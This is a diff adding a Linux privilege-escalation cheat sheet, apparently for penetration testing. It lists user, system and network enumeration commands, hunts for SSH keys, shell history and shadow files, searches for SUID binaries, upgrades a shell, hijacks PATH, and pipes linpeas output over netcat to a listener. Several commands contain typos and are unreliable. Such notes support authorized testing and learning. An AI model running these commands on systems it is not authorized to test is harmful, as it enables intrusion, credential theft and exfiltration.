@@ -1,0 +1,141 @@
+--Why is Important:
+* Resetting passwords
+* Bypassing access controls to compromise protected data
+* Editing software configuration
+* Enabling persistence
+* Changing the privilege of existing(or new) users
+* Execute any administrative command
+
+User Enum:
+
+id
+whoami
+sudo -l
+
+who -a
+last -a
+
+getent passwd
+cat /etc/passwd
+cat /etc/passwd | grep 'sh'
+cat /etc/passwd | grep -i 'sh'
+
+ls /home
+su root
+history
+find / -type f -iname '.*history'
+find / -type f -iname '.*history' 2>/dev/null
+
+System Enum:
+
+hostname
+uname -a
+cat /proc/version
+cat /proc/*release
+
+arch
+lscpu
+lshw
+lsusb
+lsblk
+lsof
+lscpi
+
+cat /proc/cpuinfo
+cat /proc/meminfo
+cat /etc/exports
+cat /etc/cpuinfo
+cat /etc/meminfo
+cat /etc/fstab
+cat /etc/rontab
+
+du -h --max-depth=1 /
+du -h --max-depth=1 / 2>/dev/null
+ps -au
+ps -aux --forest
+ps -aux --forest | grep root
+
+dmesg
+mysql --version
+getcap -r / 2>/dev/null
+env
+find / -type f -perm -04000 -ls 2>/dev/null
+find / -user root -perm -6000 -exec -ldb {} \; 2>/dev/null
+ls -la /etc/cron.*
+find / -path /proc -prune -o -type -d perm -o+w 2>/dev/null
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+Network Enum:
+
+ifconfig
+ip a
+arp -a
+ip neigh
+ip route
+netstat -anotlp
+cat etc/services | grep 25
+cat etc/services | grep 8080
+cat etc/services | grep 55858
+netstat -i 
+netstat -s
+lsof -nPi
+grep 80 /etc/services
+
+Sweet Cheatsheet:
+
+/bin/sh
+/usr/bin/script -qc /bin/bash /dev/null
+whoami
+
+which python
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+whoami
+hs /home
+
+hostname 
+uname -amr
+cat /proc/version
+ls /boot | grep vmlinuz
+
+ifconfig
+netstat -anotlp
+lsof -nPi
+sudo -l
+getcap -r / 2>/dev/null
+cat /etc/crontab
+history
+find /home -type f -iname '.*history'
+cat /etc/exports
+ls -lah /etc/shadow
+ls -l /etc/passwd
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+find / -name *id_rsa* 2>/dev/null
+
+echo $PATH
+export PATH=/tmp:$PATH
+echo $PATH
+
+Resources:
+
+https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+https://viperone.gitbook.io/pentest-everything/everything/everything-linux/linux-privilege-escalation-techniques
+
+Automated Tools:
+Linpeas: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS   
+LinEnum-master: https://github.com/rebootuser/LinEnum
+linux-exploit-suggester: https://github.com/mzet-/Linux-exploit-suggester
+Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration 
+
+LinPeas:
+./linpeas.sh --help
+./linpeas.sh
+./linpeas.sh | nc 127.0.0.1 8080 > target machine
+nc -lvnp 8080 | tee leanpeas.txt > your machine
+
+LinEnum: ./linenum.sh
+Linux Exploit Suggester: ./linuxe-exploit-suggester.sh
+ 
+ 
